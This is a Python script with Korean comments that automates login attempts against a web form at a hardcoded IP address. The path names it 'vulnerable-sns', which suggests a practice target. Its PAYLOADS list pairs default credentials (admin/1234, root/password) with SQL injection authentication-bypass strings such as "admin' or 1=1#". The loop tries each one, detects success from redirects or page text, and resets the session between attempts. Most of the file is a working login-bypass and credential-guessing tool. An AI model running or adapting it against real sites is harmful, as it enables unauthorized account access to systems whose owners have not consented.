import requests
import time

class LoginTester:
    def __init__(self, url, username_field='username', password_field='password'):
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()

    def try_login(self, username, password):
        """
        로그인 시도 후 (성공여부, 응답HTML) 반환
        """
        payload = {
            self.username_field: username,
            self.password_field: password
        }

        response = self.session.post(self.url, data=payload, allow_redirects=False)

        # 로그인 성공/실패 판단 로직
        if response.status_code == 302:
            # 보통 로그인 성공 시 리디렉션 발생
            return True, response.text
        elif "로그인 실패" in response.text or "비밀번호" in response.text:
            return False, response.text
        else:
            # 애매한 경우: 세션 페이지를 한번 검사
            dashboard = self.session.get(self.url)
            if "로그아웃" in dashboard.text or "내 정보" in dashboard.text:
                return True, dashboard.text
            return False, dashboard.text
        
    def logout(self):
        """
        간단하게 base/logout.php로 GET 요청을 보내 로그아웃 시도.
        실패하거나 확인 불가하면 세션을 재생성하여 초기화.
        """
        base = self._get_base()
        logout_url = base + "/logout.php"
        try:
            r = self.session.get(logout_url, allow_redirects=True, timeout=8)
            txt = r.text.lower()
            # 로그인 페이지나 'login' 단어가 보이면 로그아웃된 것으로 판단
            if "로그인" in txt or "login" in txt or "signed out" in txt:
                return True, f"Logged out via {logout_url}"
        except Exception as e:
            # 네트워크 오류 등 무시하고 세션 리셋
            pass

        # 마지막 수단: 세션 초기화 (쿠키 제거)
        self._reset_session()
        return True, "Session reset (cookies cleared)"
    
    def _reset_session(self):
        try:
            self.session.close()
        except Exception:
            pass
        self.session = requests.Session()

    def _get_base(self):
        """
        self.url에서 scheme+netloc만 단순 추출.
        예: 'http://example.com/path/to/login' -> 'http://example.com'
        """
        parts = self.url.split("/")
        if len(parts) >= 3:
            return parts[0] + "//" + parts[2]
        return self.url.rstrip("/")
    


# -----------------------
# PAYLOADS 목록
# -----------------------
PAYLOADS = [
    ("admin", "1234", "관리자 계정"),
    ("admin' or 1=1#","1234", "관리자 계정 SQLi"),
    ("admin", "1234' or '1'='1", "관리자 계정 SQLi"),
    ("user1", "password123", "테스트 계정"),
    ("root", "password", "루트 기본 비번")
]


# -----------------------
# 반복 로그인 시도
# -----------------------
tester = LoginTester(url="http://18.179.53.107/vulnerable-sns/www/login.php", username_field="username", password_field="password")

for i, (username, password, desc) in enumerate(PAYLOADS, 1):
    print(f"[{i}] {desc} → {username}/{password} 시도 중...")

    success, html = tester.try_login(username, password)

    if success:
        print(f"✅ 로그인 성공! ({username}/{password})\n")
        ok, info = tester.logout()
        print(f"🔁 로그아웃 처리: {info}\n")
        time.sleep(1)
    else:
        print(f"❌ 로그인 실패. ({username}/{password})\n")
        tester._reset_session()
        time.sleep(1)

